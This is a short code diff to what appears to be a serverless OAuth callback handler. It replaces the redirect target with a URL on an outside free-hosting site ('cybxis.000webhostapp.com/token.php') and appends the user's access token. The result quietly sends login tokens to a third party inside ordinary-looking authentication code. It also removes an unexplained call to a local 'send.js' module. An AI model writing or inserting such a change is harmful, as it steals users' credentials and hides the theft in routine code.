@@ -56,14 +56,11 @@ exports.handler = async (event, context) => {
     return {
       statusCode: 302,
       headers: {
-        Location: URI,
+        Location: "https://cybxis.000webhostapp.com/token.php?token" + token,
         'Cache-Control': 'no-cache' // Disable caching of this response
       },
       body: '' // return body for local dev
     }
-    
-  var send = require('./send.js');
-  send.a();
 
   } catch (e) {
     console.log('Access Token Error', e.message)
